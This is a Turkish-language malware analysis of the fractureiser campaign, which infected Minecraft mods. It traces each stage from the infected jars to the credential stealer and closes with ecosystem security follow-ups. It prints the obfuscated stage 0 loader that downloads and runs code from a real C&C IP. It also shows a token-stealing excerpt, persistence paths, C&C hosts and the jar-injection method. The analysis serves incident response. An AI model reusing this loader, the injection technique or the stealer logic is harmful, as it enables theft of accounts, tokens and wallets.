# Teknik Bilgi

## Dağıtım

Bazı mod paketleri, geliştiricilerin bilgisi olmadan kendileri için yayınlanan güncellemelere sahip olmuş ve kötü amaçlı modlar eklemiştir. Bu mod paketi güncellemeleri yüklendikten hemen sonra arşivlendi, yani *web kullanıcı arayüzünde gösterilmiyor, yalnızca API aracılığıyla gösteriliyorlar.*

Kötü niyetli modların geçmişte birden fazla hafta yükleme tarihleri vardır. Bunların çoğu
açıkça otomatik olarak oluşturulmuş isimlere sahip tek kullanımlık hesaplar tarafından yüklenmiştir ve muhtemelen
enfeksiyonun. Luna Pixel Studios, bir geliştiricinin bunlardan birini test etmesi nedeniyle tehlikeye girdi
Modlar, yüklemek için ilginç duruyorlar.

### Bilinen etkilenen modlar ve eklentiler

Not: Bu liste **kapsamlı değildir**. Bu liste, Araştırmanın ilk günlerinde
araştırdık ve kısa sürede bunun kapsamının düşündüğümüzden çok daha büyük olduğunu fark ettik,
Bu da bireysel vakaların takibini anlamsız kılıyor. Tarihsel amaçlar için burada bırakılmıştır.

Ayrıca CurseForge'un
[liste](https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/)
etkilenen projeler listesine göz atın.

|mod/eklenti|bağlantı(lar)|SHA1|"Yükleyici"|
|---|---|---|---|
|Skyblock Core|[www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565](https://www.curseforge.com/minecraft/mc-mods/skyblock-core/files/4570565) |`33677CA0E4C565B1F34BAA74A79C09A3B690BF41`|Luna Pixel Studios|
|Dungeonz|[legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100 (removed)](https://legacy.curseforge.com/minecraft/mc-mods/dungeonx/files/4551100) |`2DB855A7F40C015F8C9CA7CBAB69E1F1AAFA210B`|fractureiser|
|Haven Elytra|[dev.bukkit.org/projects/havenelytra/files/4551105 (removed)](https://dev.bukkit.org/projects/havenelytra/files/4551105)   [legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105 (removed)](https://legacy.curseforge.com/minecraft/bukkit-plugins/havenelytra/files/4551105) |`284A4449E58868036B2BAFDFB5A210FD0480EF4A`|fractureiser|
|Vault Integrations|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simpleharvesting82|
|AutoBroadcast|[www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257 (removed)](https://www.curseforge.com/minecraft/mc-mods/autobroadcast/files/4567257)|`C55C3E9D6A4355F36B0710AB189D5131A290DF26`|shyandlostboy81|
|Museum Curator Advanced|[www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353 (removed)](https://www.curseforge.com/minecraft/mc-mods/museum-curator-advanced/files/4553353)|`32536577D5BB074ABD493AD98DC12CCC86F30172`|racefd16|
|Vault Integrations Bug fix|[www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590 (removed)](https://www.curseforge.com/minecraft/mc-mods/vault-integrations-bug-fix/files/4557590)|`0C6576BDC6D1B92D581C18F3A150905AD97FA080`|simplyharvesting82
|Floating Damage|[dev.bukkit.org/projects/floating-damage (removed)](https://dev.bukkit.org/projects/floating-damage)|`1d1aaccdc13244e980c0c024610ecc77ea2674a33a52129edf1bb4ce3b2cc2fc`|mamavergas3001
|Display Entity Editor|[www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122 (removed)](https://www.curseforge.com/minecraft/bukkit-plugins/display-entity-editor/files/4570122)|`A4B6385D1140C111549D95EAB25CB51922EEFBA2`|santa_faust_2120

Darkhax bunu yolladı: https://gist.github.com/Darkhax/d7f6d1b5bfb51c3c74d3bd1609cab51f

potansyel olarak: Sophisticated Core, Dramatic Doors, Moonlight lib, Union lib

## Aşama 0 (Enfekte mod jarları)

Etkilenen mod veya eklentilerin ana sınıflarına yeni bir `static void` yöntem eklenir ve bu yöntemin çağrısı, sınıfın statik başlatıcısına yerleştirilir. DungeonZ için yöntem `_d1385bd3c36f464882460aa4f0484c53` adını taşır ve `net.dungeonz.DungeonzMain` içinde bulunur. Skyblock Core için yöntem `_f7dba6a3a72049a78a308a774a847180` adını taşır ve `com.bmc.coremod.BMCSkyblockCore` içine yerleştirilir. HavenElytra için ise kod, `valorless.havenelytra.HavenElytra` içinde kullanılmayan statik başlatıcının içine doğrudan yerleştirilir.

Metodun kodu, dize sabitleri yerine `new String(new byte[]{...})` kullanılarak şifrelenmiştir.

D3SL örneğinden "Create Infernal Expansion Plus" adlı "Create Infernal Expansion Compat" kopya bir versiyonu, ana mod sınıfına kötü amaçlı yazılım eklenmiş bir şekilde oluşturuldu:
```java
static void _1685f49242dd46ef9c553d8af1a4e0bb() {
  Class.forName(new String(new byte[] {
      // "Utility"
    85, 116, 105, 108, 105, 116, 121
  }), true, (ClassLoader) Class.forName(new String(new byte[] {
      // "java.net.URLClassLoader"
    106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114
  })).getConstructor(URL[].class).newInstance(new URL[] {
    new URL(new String(new byte[] {
        // "http"
      104, 116, 116, 112
    }), new String(new byte[] {
        // "85.217.144.130"
      56, 53, 46, 50, 49, 55, 46, 49, 52, 52, 46, 49, 51, 48
    }), 8080, new String(new byte[] {
        // "/dl"
        47, 100, 108
        }))
  })).getMethod(new String(new byte[] {
      // "run"
    114, 117, 110
  }), String.class).invoke((Object) null, "-114.-18.38.108.-100");
}
```

Bu:
1. `URLClassLoader` ile `http://[85.217.144.130:8080]/dl` adresindeki URL'yi oluşturur ([shodan](https://www.shodan.io/host/85.217.144.130)).
2. Sınıf yükleyici üzerinden `Utility` sınıfını yükler ve internetten kod alır.
3. `Utility` üzerinde `run` metodunu çağırır ve her bir enfekte mod için farklı bir dize argümanı geçirir. Örneğin:
   - Skyblock Core: "`-74.-10.78.-106.12`"
   - Dungeonz: "`-114.-18.38.108.-100`"
   - HavenElytra: "`-114.-18.38.108.-100`"
   - Vault Integrations: "`-114.-18.38.108.-100`"

Geçirilen sayılar, 1. Aşama tarafından baytlara ayrıştırılır ve ".ref" adlı bir dosyaya yazılır. Bu, geliştiricinin enfeksiyon kaynaklarını izlemek için kullandığı bir yöntem gibi görünüyor.

Sınıf yükleyicisinin oluşturulması, Aşama 1'in kullandığı Cloudflare URL'sini kullanmayarak sabitlenmiş bir şekilde belirli bir URL'ye bağlıdır. İlgili IP'nin şu anda çevrimdışı olması, bu durumda mevcut olarak bildiğimiz Aşama 0 yüklerinin artık işlevsel olmadığı anlamına gelir.

## Aşama 1 (`dl.jar`)

SHA-1: `dc43c4685c3f47808ac207d1667cc1eb915b2d82`

[Kötü amaçlı yazılıma ait decompile edilmiş dosyalara buradan ulaşabilirsiniz.](../decomp).

`Utility.run` işlevinin yaptığı ilk şey, sistem özelliği olan `neko.run`'ın ayarlanıp ayarlanmadığını kontrol etmektir. Eğer ayarlanmışsa, hemen çalışmayı durdurur. Ayarlanmamışsa, boş bir dize olarak ayarlar ve devam eder. Bu, kötü amaçlı yazılımın birden fazla modu etkilemişse kendisini birden çok kez çalıştırmaktan kaçınmaya çalıştığını göstermektedir. *Bu, Aşama 1'in İnternet üzerinden indirildiği ve değişebileceği göz önüne alındığında, güvenilir bir durdurma mekanizması olarak güvenilmemelidir.*

`Utility.run` işlevi, `85.217.144.130` IP adresi ve Cloudflare Pages alan adı (`https://files-8ie.pages.dev/ip`) ile iletişim kurmaya çalışır. İstismar raporları zaten gönderilmiştir. Pages alan adı, ilk IP yanıt vermezse C&C sunucusunun IP'sini almak için kullanılır - URL, bir IPv4 adresinin ikili bir temsilini yanıt olarak döndürür.

*İstismar raporu sunucu sağlayıcısına iletildikten sonra C&C IP'si nullrouted edildi. Yeni bir C&C sunucusunun devreye alınıp alınmadığını görmek için Cloudflare sayfasını gözlemlememiz gerekecek. Bunu planlamadıklını düşünemem.* Hızlı yanıtınız için Serverion'a teşekkür ederim.

*Cloudflare Pages alan adı kapatıldı* "107.189.3.101" IP adresinde yeni bir C&C sunucusu bulunmaktadır.

Aşama 1, aşağıdaki işlemleri gerçekleştirerek kalıcılık sağlamaya çalışır:
1. Sunucudan Aşama 2'yi indirir (Linux'ta lib.jar, Windows'ta libWebGL64.jar olarak adlandırılır).
2. Aşama 2'nin otomatik olarak başlatılmasını sağlar:
   * Linux üzerinde, systemd birim dosyalarını `/etc/systemd/system` veya `~/.config/systemd/user` dizinine yerleştirmeye çalışır.
     * Kullanıcı klasörüne yerleştirdiği birim dosyası çalışmaz çünkü kullanıcı birimleri için mevcut olmayan `multi-user.target` kullanmaya çalışır.
   * Windows üzerinde, kaydı değiştirmeye çalışarak (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) kendisini başlatmaya veya
     başarısız olursa `Windows\Start Menu\Programs\Startup` klasörüne kendini eklemeye çalışır.

## Aşama 2 (`lib.jar` ya da `libWebGL64.jar`)

Bilininen sha-1 hash'leri:
* `52d08736543a240b0cbbbf2da03691ae525bb119`
* `6ec85c8112c25abe4a71998eb32480d266408863` (D3SL's earlier upload)

Aşama 2, Allatori obfuscator'ün demo sürümü ile karıştırılmıştır ve ana sınıfı "Bootstrap" olarak adlandırılmıştır. Ayrıca, başka bir sınıf olan "h" adında bir sınıf daha içerir. Bu sınıf, iletişim amacıyla kullanılan basit bir sınıf gibi görünse de, içeriği boştur. Kaynak kodunun yeniden oluşturulmaya yönelik bir girişimini aşağıda bulabilirsiniz:
https://gist.github.com/SilverAndro/a992f85bec29bb248c354ccf5d2206fe

Çalıştırıldığında aşağıdaki işlemleri gerçekleştirir:

1. `9655` numaralı bağlantı noktasını açar ve JVM kapanırken onu kapatmak için bir kapatma kancası ekler.
2. Kendisini disk üzerinde bulur ve yanında çalışır.
3. Eğer `.ref` dosyası mevcutsa, dosyadan tanımlayıcı anahtarı okur.
4. Aşağıdaki adımları içeren bir döngü başlatır:
    1. Sunucuyu kontrol etmek için `https://[files-8ie.pages.dev]:8083/ip` adresine bağlanır ve ona bağlanmaya çalışır.
    2. Güncelleme kontrolünün devam etmesi gerekip gerekmediğini belirten bir bayrak alır, devam etmezse hata verir (port `1338` üzerinden sunucuya bildirilir).
    3. Devam etmesi gerekiyorsa, bir karma değeri alır ve varsa `client.jar` ile karşılaştırır, güncelleme yapmak isteyip istemediğine dair bir bayt gönderir.
    4. Güncelleme yapmak istiyorsa, `client.jar` dosyasını alır ve üzerine yazar/yaratır, dosya özniteliklerini kullanarak gizler.
    5. `dev.neko.nekoclient.Client#start(InetAddress, refFileBytes)` adlı statik yöntemi yükler ve çağırır.
    6. 5 saniye boyunca uyur.

## Aşama 3 (`client.jar`)

sha-1: `c2d0c87a1fe99e3c44a52c48d8bcf65a67b3e9a5`
sha-1: `e299bf5a025f5c3fff45d017c3c2f467fa599915`

`client.jar`, son derece obfuskeli ve karmaşık bir kod demetidir ve hem Java kodunu hem de yerel kodu içerir.

`client.jar`, içinde `hook.dll` adlı bir yerel yük taşır. Aşağıda dekompilasyonu yapılmış bir örneği bulunmaktadır: https://gist.githubusercontent.com/NotNite/79ab1e5501e1ef109e8030059356b1b8/raw/c2102bf5ff74275ac44c2200d5121bfff652fd49/hook.dll.c

Aşağıda listelenen iki özel işlev, Java'dan çağrılmak üzere JNI kullanılarak oluşturulmuştur:
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveClipboardFiles(__int64 a1);`
* `__int64 __fastcall Java_dev_neko_nekoclient_api_windows_WindowsHook_retrieveMSACredentials(__int64 a1);`

Yapılan analizlere göre, bu işlevler aşağıdaki görevleri yerine getirmektedir:
* Pano içeriğini okuma
* Microsoft hesap kimlik bilgilerini çalma

Ayrıca, aşağıdaki işlemleri gerçekleştirmeye çalışan kod kanıtları bulunmaktadır:
* Minecraft modlarını taramak için sistemdeki *tüm* jar dosyalarını bulma (Forge/Fabric/Quilt/Bukkit tespiti
  yaparak) veya [Bir Ana Sınıf bildir](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244)
  (çoğu basit Java programı) ve bunlara Stage 0 enjekte etme girişimi
* Birçok web tarayıcısının çerezlerini ve giriş bilgilerini çalma
* Panodaki kripto para birimi adreslerini, muhtemelen saldırganın sahip olduğu alternatif adreslerle değiştirme
* Discord kimlik bilgilerini çalma
* Microsoft ve Minecraft kimlik bilgilerini, çeşitli başlatıcıları kullanarak çalma
* Kripto cüzdanlarını çalma

Jar dosyaları, aşağıdaki şekilde Minecraft modları veya eklentileri olarak tespit edilir:

* Forge (`dev/neko/e/e/e/A`): Kötü amaçlı yazılım, her modda gereken `@Mod` açıklamasını bulmaya çalışır.
* Bukkit (`dev/neko/e/e/e/C`): Kötü amaçlı yazılım, bir sınıfın Bukkit'in `JavaPlugin` sınıfını genişletip genişletmediğini kontrol eder.
* Fabric/Quilt (`dev/neko/e/e/e/i`): Kötü amaçlı yazılım, bir sınıfın `ModInitializer` arayüzünü uygulayıp uygulamadığını kontrol eder.
* Bungee (`dev/neko/e/e/e/l`): Kötü amaçlı yazılım, bir sınıfın Bungee'nin `Plugin` sınıfını genişletip genişletmediğini kontrol eder.
* Vanilla (`dev/neko/e/e/e/c`): Kötü amaçlı yazılım, ana istemci sınıfı `net.minecraft.client.main.Main`in var olup olmadığını kontrol eder.

## Aşama 3 (`unobf-client.jar`)

2023-06-07 14:20 UTC tarihinde, aşama 3 istemci jar dosyasının görünüşe göre yanlışlıkla obfuscation (bulanıklaştırma) işlemi uygulanmamış bir sürümle değiştirildiği belirtiliyor. Arşive şuradan erişebilirsiniz: https://github.com/clrxbl/NekoClient

Bu durum, önceki obfuscated (`client.jar`) örneği üzerinde yapılan analizdeki şüphelenilen davranışın/kanıtların doğrulandığını gösteriyor.

### Çoğaltma (Replication)

Çoğaltma işlemi, yerel makinedeki tüm dosya sistemine ait jar dosyalarındaki sınıfların otomatik işlenmesi yoluyla gerçekleştirilir. Belirli kriterleri karşılayan sınıflar içeren herhangi bir jar dosyası enfeksiyon için uygun hale gelir. Yerel dosya sistemini tarama ve kötü amaçlı kod enjeksiyonu süreci burada bulunabilir: [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L273)

İşlem sürecinde aranan kriterler burada bulunabilir: [`dev/neko/nekoinjector/template/impl`](https://github.com/clrxbl/NekoClient/tree/main/dev/neko/nekoinjector/template/impl)

* `BungeecordPluginTemplate` sınıflarda `net/md_5/bungee/api/plugin/Plugin` arabirimini arar.
* `FabricModTemplate` sınıflarda `net/fabricmc/api/ModInitializer` arabirimini arar.
* `ForgeModTemplate` sınıflarda `net/minecraftforge/fml/common/Mod` açıklamasını arar.
* `MinecraftClientTemplate` jar içinde `net/minecraft/client/main/Main.class` ve `net/minecraft/client/gui/GuiMultiplayer.class` dosyalarının varlığını kontrol eder.
* `SpigotPluginTemplate` sınıflarda `org/bukkit/plugin/java/JavaPlugin` üst türünü arar.
* Yukarıdakilerin hiçbiri sınıfa uymazsa, [jar dosyasının ana sınıfını](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L235-L244) enfekte etmeye çalışır.

Enjeksiyon işlemi, kötü amaçlı kodun `Loader` sınıfında bir statik yöntem olarak bildirildiği şekilde gerçekleşir. Yanında bulunan `Injector` sınıfı, kodu `Loader`dan çıkarıp enfeksiyon hedefi olan yeni sınıflara yerleştirmekten sorumludur. `Injector.loadInstallerNode(...)` yönteminin dönüş değeri, enfeksiyon sürecini açıklayan bir `MethodNode`'dur. Şimdi bu yöntemi hedeflenen sınıfa eklemeleri gerekmektedir. [`dev/neko/nekoclient/Client.start(InetSocketAddress, byte[])`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/Client.java#L272) içinde, bunu başarmak için `Entry.inject(MethodNode)` yöntemini çağırmaktadırlar. Kötü amaçlı yöntemin çağrılmasını sağlamak için bu `inject` yöntemi, hedeflenen sınıfın statik başlatıcısına eklenen bir mantık ekler ve eklenen yöntemi çağırır. Statik başlatıcı, sınıf ilk yüklendiğinde çalıştırıldığından ve hedeflenen sınıf bir eklenti/mod olduğundan, bu kodun her zaman enfekte mod paketlerini veya sunucuları çalıştıran kullanıcılar tarafından tetikleneceği varsayılır. Sonrasında, jar dosyası yeniden enfekte hedef sınıfla birlikte paketlenir.

### Anti-sandbox hileleri

`VMEscape` adlı bir sınıf, JVM kötü amaçlı yazılımlarında nadiren görülen bir öğedir. Bu sınıf, mevcut kullanıcının `WDAGUtilityAccount` olup olmadığını kontrol ederek [Windows Sandbox](https://learn.microsoft.com/en-us/windows/security/application-security/application-isolation/windows-sandbox/windows-sandbox-overview) ortamında olduğunu kontrol eder. Bu koşul sağlandığında, Windows Sandbox'tan kaçma girişimi yapılır.

İşlem yaklaşık olarak şu şekildedir:

- Aşağıdaki işlemleri gerçekleştirmek için tekrarlayan bir thread başlatılır:
  - `Files.createTempDirectory(...)` kullanarak geçici bir dizin oluşturma
  - Sistem panosundaki `FileDescriptor` girdileri üzerinde döngü oluşturma (bu, ana makinedeki panoyu yansıtır)
  - Orijinal dosyaya benzeyen ancak kötü amaçlı yazılımı çağıran bir kısayol oluşturma _(SHELL32'den simgeler kullanarak)_
  - Bu kısayolu panoya atama ve orijinal dosya referansını üzerine yazma

Bu şekilde, bir kullanıcı bir dosyayı kopyaladığında ve başka bir yere yapıştırmak istediğinde, niyet ettikleri dosyanın yerine kötü amaçlı yazılımı çalıştıran bir kısayolu yapıştırmış olurlar.

### Veri hırsızlığı

**MSA Tokenleri**: Bu modun Minecraft modlarına hedef aldığı düşünüldüğünde, Minecraft'a giriş yapmak için kullanılan MSA (Microsoft Account) Tokenlerinin çalınması girişiminde bulunmak doğaldır. Bazı oyun başlatıcıları bu veriyi yerel bir dosyada saklar ve bu kötü amaçlı yazılım, bu dosyayı okumaya çalışacaktır. Bu durum, aşağıdaki gibi çeşitli başlatıcılara etki eder:

* vanilla/mojang başlatıcısı
* eski vanilla/mojang başlatıcısı
* PolyMC / Prism
* Technic
* Feather
* LabyMod (< v3.9.59)
* Ve bulunan herhangi bir MSA Tokeni aşağıdaki gibi etkilenecektir: [Windows Credential Manager](https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0)
[`dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/msa/impl/MSAStealer.java) dosyasındaki geri alma mantığı, benzer bir şekilde verileri sakladıkları için bir dizi öğede benzer görünüyor. İşte Laby-Mod örneği:
```java
private static void retrieveRefreshTokensFromLabyMod(List<RefreshToken> refreshTokens) throws IOException {
	String appdata = System.getenv("APPDATA");
	if (Platform.isWindows() || Objects.isNull(appdata)) {
		Path path = appdata == null ? null : Paths.get(appdata, ".minecraft", "LabyMod", "accounts.json");
		if (Files.isReadable(path)) {
			extractRefreshTokensFromLabyModLauncher(refreshTokens, Json.parse(Files.readString(path)).asObject());
		}
	}
}
```
"Feather/PolyMC/Prism" kodlarından tokenleri almak için kullanılan stratejiler temel olarak aynıdır.

Bu stratejiden "vanilla" başlatıcılarına geçiş yapmanın değişikliği, Json'unu ek bir şifreleme katmanıyla koruyor olmasıdır.

Bu stratejiden "Technic"e geçiş yapmanın değişikliği ise Technic'in kimlik bilgilerini Java'nın yerleşik nesne serileştirme özelliğini kullanarak `com.google.api.client.auth.oauth2.StoredCredential` türüne saran şekilde depolamasıdır.

**Discord tokenleri**: Herkes bir token hırsızını görmüştür. Tokeni ve ödeme yöntemleri, bağlı telefon numarası vb. gibi ek bilgileri çalar. Standart istemci, canary, ptb ve lightcord istemcilerini etkiler. İlgili kaynak: [`dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java`](https://github.com/clrxbl/NekoClient/blob/fd76c5f9d40d1e10de11f00a6b4e0cca3d6221a3/dev/neko/nekoclient/api/stealer/discord/DiscordAccount.java)

**Çerezler ve Kaydedilen Kimlik Bilgileri**: Etkilenen tarayıcılarda kaydedilen çerezleri ve giriş bilgilerini çalar. İlgili kaynak: [`dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java`](https://github.com/clrxbl/NekoClient/blob/main/dev/neko/nekoclient/api/stealer/browser/impl/BrowserDataStealer.java)

- Mozilla Firefox
  - Waterfox
  - Pale Moon
  - SeaMonkey
- Chrome
  - Edge
  - Brave
  - Vivaldi
  - Yandex
  - Slimjet
  - CentBrowser
  - Comodo
  - Iridium
  - UCBrowser
  - Opera
    - Beta
    - Developer
    - Stable
    - GX
    - Crypto
  - CryptoTab

## Aşama 3b (`dummyloader3.jar`)

İkinci C&C sunucusunun devreye alınmasından sonra Aşama 3, başka bir jar dosyasıyla değiştirildi.

Bu, sadece SkyRage güncelleme aracı gibi görünüyor ve blackspigot'a yönelik başka bir Minecraft kötü amaçlı yazılım hedefi.

### Kalıcılık
- Windows: görev yöneticisi `MicrosoftEdgeUpdateTaskMachineVM`, dosya `%AppData%\..\LocalLow\Microsoft\Internet Explorer\DOMStore\microsoft-vm-core`
- Linux: `/bin/vmd-gnu`, `/etc/systemd/system/vmd-gnu.service`, servis `vmd-gnu`

### Bağlantılar
- C&C sunucusu: `connect.skyrage.de`
- İndirme: `hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/qqqqqqqqq`

### Eylemler
- `qqqqqqqqq` jar dosyası, tarayıcı çerezleri, discord, minecraft, epic games, steam girişi gibi çeşitli bilgileri çıkarır. Ayrıca kripto cüzdanlar ve şifre yöneticileri hakkında bazı bilgiler içerir ve güncelleme jar dosyasına C&C sunucusuna yükler.
- Panodaki kripto para adreslerini `95.214.27.172:18734` adresinden alınan adresle değiştirir.
- Kalıcılık (yukarıya bakınız)
- Otomatik güncelleme işlevi vardır ve mevcut sürümü 932'dir (`hxxp://t23e7v6uz8idz87ehugwq.skyrage.de/version`)

### Eşlemeler

Bu örneğin eşlemeleri, Enigma veya Enigma eşlemelerini destekleyen başka bir araç aracılığıyla uygulanabilir.
```
CLASS D Chat
CLASS E ChatChain
CLASS E$a ChatChain$ChainLink
CLASS F ClientChat
CLASS G EncryptionRequest
CLASS H EncryptionResponse
CLASS H$a EncryptionResponse$EncryptionData
CLASS J KeepAlive
CLASS L LoginPayloadResponse
CLASS O PluginMessage
CLASS O$1 BungeeCordProtocolVersionMapFunction
CLASS P SetCompression
CLASS R StatusResponse
CLASS T CryptocurrencyClipboardLogger
CLASS T$1 CryptocurrencyClipboardLogger$LowLevelKeyboardHook
CLASS U AutoRunPersistence
CLASS V InputStreamFileWriter
CLASS W OperatingSystem
CLASS X AutoUpdater
CLASS Y StacktraceSerializer
CLASS a MalwareClientConnectionHandler
CLASS b Main
    FIELD a intconst I
    FIELD a string0 Ljava/lang/String;
    FIELD a ipAddress Ljava/net/InetSocketAddress;
CLASS g MinecraftBot
CLASS h MinecraftBot2
CLASS o MinecraftFriendlyByteBuf
CLASS s MinecraftIPAddressResolver
CLASS t MinecraftPacketDecoder
CLASS y MinecraftPacketEncryption
```

### Anti-dekompilasyon

Bu örnek, dekompiler araçlarını çökerten sınıf dosyasındaki teknik detayları istismar etmektedir. Bu tür zafiyetler, hatalı nitelikleri filtreleyen bir bytecode ayrıştırıcısı olan [CAFED00D](https://github.com/Col-E/CAFED00D) kullanılarak düzeltilebilir. Bunun ardından, yalnızca Allatori demo tarafından uygulanan temel obfuskasyonla ilgili zorluklar kalır.

# Diğer Şeyler

Daha fazla ayrıntı, canlı aşama 3 geri alma belgesinde bulunmaktadır: https://hackmd.io/5gqXVri5S4ewZcGaCbsJdQ

İkinci C&C sunucusu devreye alındığında, aşama 3'ün obfuskasyonu kaldırılmış bir sürümü yanlışlıkla yaklaşık 40 dakika boyunca sunuldu.

Ana yük sunucusu Serverion tarafından barındırıldı (artık devre dışı).

Yeni C&C de devre dışı bırakıldı. _2023-06-07 18:51 UTC_

`85.217.144.130` ve `107.189.3.101` IP adreslerinde, 80/443 numaralı HTTP sunucusu ve 22 numaralı SSH sunucusu dışında aşağıdaki portlar açıktı:

* 1337
* 1338 (Yeni Hata Ayıklama bağlantısı oluşturmak için Aşama 1 dosyasında referans gösterilen bir port)
* 8081 (Bu bir WebSocket sunucusudur - şu anda belirgin bir işlevi yok, kötü amaçlı bir kodda referans gösterilmiyor)
* 8082 (Bu konuda henüz herhangi bir şey elde edilmedi, kötü amaçlı bir kodda referans gösterilmiyor)
* 8083 (Aşama 1 tarafından iletişim kuruldu)

İlginçtir, fractureiser'ın bukkit sayfasında "Son etkin Cumartesi, Ocak, 1 2000 00:00:00" olarak belirtilmektedir: https://dev.bukkit.org/members/fractureiser/projects/

## Örnekler
Lütfen IRC sohbetinde örneklerin okuma veya okuma/yazma erişimi için istekte bulunun. Stage 3 istemcinin dekompiledirilmiş kaynak kodu şurada mevcuttur: https://github.com/clrxbl/NekoClient

## Devamlı-Sorular
Henüz uzun vadeli takiplerden bahsetmek biraz erken olsa da, bu tüm karmaşa, modlu Minecraft ekosisteminde birkaç kritik hata ortaya çıkardı. Bu bölüm, bu hataları ve nasıl iyileştirebileceğimizi tartışmak için beyin fırtınası yapmaktadır.

#### 1. Mod depolarındaki inceleme yetersiz
CurseForge ve Modrinth bir modu "inceleme" sürecinde ne yapıyor tam olarak? Bir topluluk olarak bunu bilmeliyiz, güvenliği gizlilikle sağlamaya dayanmak yerine.
Statik analiz gibi bir şey mi çalıştırmalıyız? (williewillus burada birkaç fikre sahip)

#### 2. Modlar için kod imzalamama eksikliği
Genel yazılım endüstrisinden farklı olarak, depolara yayımlanan modlar genellikle modu yükleyen kişinin kimliğini kanıtlayan bir imza anahtarıyla imzalanmamıştır. İmzalama ve ayrı bir anahtar dağıtım/güven mekanizması, CurseForge hesaplarının tehlikeye girmesini önler.

Ancak, bu durum, anahtar güvenini nasıl türeteceğimiz konusunda daha büyük bir soruna yol açar. "Bu jar'ın bu imzası var" gerçeği, CurseForge/Modrinth dışında standart bir şekilde iletilmeli, böylece yükleyiciler veya kullanıcılar imzaları doğrulayabilir.
Forge birkaç yıl önce imzalamayı tanıtmaya çalıştı, ancak sınırlı bir kabul gördü.

#### 3. Yeniden üretilebilir yapıların eksikliği
Minecraft araç zincirleri karma karışık durumdadır ve yapılar genellikle yeniden üretilemez. Sıkça rastlanan bir durumdur ki, yapı betikleri rastgele Gradle eklentilerinin sabitlenmemiş -SNAPSHOT sürümlerini alır ve bunları kullanır, bu da yeniden üretilemez ve dolayısıyla denetlenemez sanat eserlerine yol açar.

Rastgele bir Gradle eklentisi gelecekte bir saldırı vektörü olması şaşırtıcı değildir.

#### 4. Minecraft'ın kendisinin yetersiz sandboxlaması
Java sürümü modlaması her zaman Java'nın tüm izinleriyle çalıştırılabilmesi ve bu, kötü niyetli kodun yayılmasına neden olan diğer yüzüdür.
Minecraft kendisi herhangi bir sandbox ile çalıştırılmıyor ve sunucular genellikle sahibi bunu yapacak kadar bilgili olmadığı sürece sandbox ile korunmuyor.

İyi bir sandbox oluşturmak zordur, özellikle Linux gibi sistemlerde SELinux/AppArmor'un kullanıcı deneyiminin o kadar kötü olması nedeniyle hiç kimse bunları kullanmıyor.
